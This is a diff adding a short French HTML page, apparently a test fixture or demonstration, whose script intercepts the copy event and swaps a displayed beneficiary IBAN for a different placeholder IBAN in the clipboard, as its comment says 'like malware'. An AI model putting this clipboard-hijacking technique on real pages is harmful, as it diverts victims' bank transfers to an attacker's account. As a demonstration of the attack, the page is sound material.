@@ -1,0 +1,17 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>page qui remplace l'IBAN copié</title>
+<body>
+<p>IBAN du bénéficiaire : <span id="iban">FR76 3000 6000 0112 3456 7890 189</span></p>
+<button id="copy">Copier l'IBAN</button>
+<script>
+  // Comme un logiciel malveillant : au moment de copier, on met un autre IBAN dans le presse-papiers.
+  document.addEventListener("copy", (e) => {
+    e.clipboardData.setData("text/plain", "FR7600000000000000000000000");
+    e.preventDefault();
+  });
+  document.getElementById("copy").onclick = () => {
+    getSelection().selectAllChildren(document.getElementById("iban"));
+    window.__copied = document.execCommand("copy");
+  };
+</script>
